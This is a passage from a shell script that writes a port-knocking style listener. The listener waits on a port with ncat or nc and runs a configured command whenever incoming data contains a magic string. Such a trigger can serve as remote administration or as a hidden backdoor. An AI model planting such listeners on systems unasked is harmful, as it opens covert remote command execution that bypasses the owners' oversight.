while true; do DATA=\$(ncat -l -p "${SP}" -w 5 2>/dev/null || nc -l -p "${SP}" -w 5 2>/dev/null)
[[ "\$DATA" == *"${MS}"* ]] && { ${ACMD} & }; done
SEOF
            chmod 700 "${KNOCK_DIR}/spa_listener.sh"
